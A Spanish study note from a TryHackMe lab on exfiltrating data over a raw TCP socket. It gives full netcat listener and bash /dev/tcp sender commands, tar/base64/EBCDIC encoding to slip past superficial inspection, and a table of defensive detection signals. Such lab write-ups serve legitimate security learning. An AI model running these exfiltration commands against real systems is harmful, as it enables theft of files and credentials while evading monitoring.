---
tags: [red-team, data-exfiltration, tcp, netcat, base64]
created: 2026-04-22
source: TryHackMe - Data Exfiltration
related:
  - "[[Data Exfiltration Concepts]]"
---

# Exfiltración por TCP Socket

> [!abstract] TL;DR
> Abrir un socket TCP puro entre víctima y atacante: `nc` escuchando de un lado, `/dev/tcp/ip/port` del otro. Se combina con `tar | base64 | dd conv=ebcdic` para que el stream capturado no sea legible ni permita identificar el tipo de archivo. Método rápido y simple, pero **visible a cualquier IDS** porque no imita ningún protocolo conocido.

## Cuándo usarlo

Esta técnica sirve cuando **no hay inspección de red profunda** (o no la hay en esa VLAN concreta): labs internos, segmentos OT legacy, redes mal segmentadas. En cualquier red monitoreada seriamente, un flujo TCP hacia un puerto alto sin handshake protocolar dispara alertas en cuestión de minutos.

> [!warning]
> Es útil para aprender los primitivos (sockets + encoding) pero en una operación real suele ser la primera opción *descartada* por OPSEC.

## Flujo

```
┌─────────────┐                                       ┌─────────────┐
│   VÍCTIMA   │                                       │   ATACANTE  │
│             │                                       │  (JumpBox)  │
│  task4/  ─┐ │                                       │             │
│           ▼ │                                       │             │
│  tar zcf -  │                                       │             │
│    │        │                                       │             │
│    ▼        │                                       │             │
│  base64     │                                       │             │
│    │        │         TCP 8080                      │             │
│    ▼        │    (payload ofuscado)                 │             │
│  dd ebcdic ─┼──────────────────────────────────────▶│  nc -lvp    │
│             │                                       │    8080     │
│             │                                       │   > out.data│
└─────────────┘                                       └─────────────┘
```

Tres pasos conceptuales:
1. El atacante **escucha** en un puerto TCP.
2. La víctima **empaqueta + ofusca** los datos.
3. Los manda por un socket abierto directamente contra el puerto del atacante.

## Listener en el atacante (JumpBox)

```shell
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
```

- `-l` listen.
- `-v` verbose (muestra quién se conecta).
- `-p 8080` puerto fijo.
- `> /tmp/task4-creds.data` redirige lo recibido a un archivo.

Todo lo que entre por ese socket se escribe tal cual al archivo, sin procesamiento.

## Envío desde la víctima

```shell
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

### Desglose del one-liner

| Etapa | Qué hace | Por qué |
|---|---|---|
| `tar zcf - task4/` | Empaqueta el directorio y manda el tarball por stdout | Consolidar múltiples archivos en un stream único |
| `\| base64` | Codifica el binario en ASCII imprimible | Evita que bytes de control corten el stream y facilita manipulación |
| `\| dd conv=ebcdic` | Re-codifica ASCII → EBCDIC | Ofuscación: el resultado ya no parece base64 a simple vista |
| `> /dev/tcp/IP/PORT` | Feature de bash: abre un socket TCP como si fuera un archivo | Permite exfiltrar sin depender de `nc` en la víctima |

> [!tip]
> `/dev/tcp/<ip>/<port>` es un **device virtual** de bash (no existe realmente en el filesystem). Cualquier redirección hacia él abre un socket TCP. Es útil cuando la víctima no tiene `nc`, `curl` ni herramientas de red instaladas — basta con que tenga bash.

### Por qué base64 + EBCDIC

- **Base64 solo**: un analista que capture el stream ve texto imprimible, lo decodifica y obtiene el tarball original.
- **Base64 + EBCDIC**: el tráfico queda como bytes que no matchean ninguna codificación estándar moderna (EBCDIC es de mainframes IBM). Quien capture necesita saber que hay una doble transformación para revertirla.

No es cifrado real — es *oscuridad por capas*. Suficiente para evadir inspección superficial, inútil contra un analista determinado.

## Reconstrucción en el atacante

```shell
thm@jump-box$ dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar
thm@jump-box$ tar xvf task4-creds.tar
thm@jump-box$ cat task4/creds.txt
```

Revertimos en orden inverso al envío:

```
EBCDIC ──► ASCII ──► Base64 ──► tar ──► archivos originales
        (dd)      (base64 -d)  (tar xvf)
```

## Comandos Clave

```shell
# Listener
nc -lvp 8080 > /tmp/out.data

# Envío víctima (con compresión + doble encoding)
tar zcf - <dir>/ | base64 | dd conv=ebcdic > /dev/tcp/<ATTACKER_IP>/8080

# Decodificar en el atacante
dd conv=ascii if=out.data | base64 -d > out.tar
tar xvf out.tar
```

## OPSEC / Detección

| Señal defensiva | Qué ve el blue team |
|---|---|
| Conexión TCP saliente a puerto alto no registrado | Flow export / NetFlow con puerto destino inusual |
| Host interno iniciando sesión hacia IP externa poco común | Threat intel de IPs/ASN |
| Volumen anómalo en flujo corto | Sesión que transfiere MB a una IP nueva → alerta |
| Sin handshake TLS/HTTP sobre puerto típicamente cifrado | Zeek detecta "raw TCP" en puertos donde esperaría protocolo |

> [!warning]
> Cualquier NIDS moderno (Suricata, Zeek) clasifica este patrón como *non-standard traffic* y lo eleva a revisión manual.

## Preguntas y Respuestas

- **La exfiltración por TCP socket se apoya en protocolos ____________.**
  → `non-standard`
